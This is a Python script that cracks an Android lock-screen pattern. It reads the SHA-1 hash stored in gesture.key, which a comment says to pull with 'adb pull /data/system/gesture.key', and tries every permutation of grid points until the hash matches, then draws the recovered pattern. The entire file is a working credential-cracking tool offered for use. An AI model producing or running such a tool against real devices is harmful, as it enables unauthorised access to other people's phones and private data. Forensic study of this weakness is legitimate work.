import sys
import hashlib
import itertools

MIN_LENGTH = 3
MAX_LENGTH = 9

# Read hash from gesture.key file
# adb pull /data/system/gesture.key
with open(sys.argv[1], 'rb') as f:
    target_hash = f.read().hex()

print('Target hash', target_hash)

# Crack
found = False
answer = None

for pattern_length in range(MIN_LENGTH, MAX_LENGTH + 1): # 3 - 9
    combinations = itertools.permutations(range(0, 9), pattern_length) # DO NOT use `itertools.combinations()`

    for guess in combinations:
        guess_hash = hashlib.sha1(bytes(guess)).hexdigest()

        if guess_hash == target_hash: # FOUND
            found = True
            answer = guess
            break

    if found:
        break

# Print result
print('Answer', answer)

for y in range(3):
    for x in range(3):
        position = 3 * y + x
        if position in answer:
            print(f'| {answer.index(position)} |', end='')
        else:
            print('|   |', end='')
    print('\n===============')
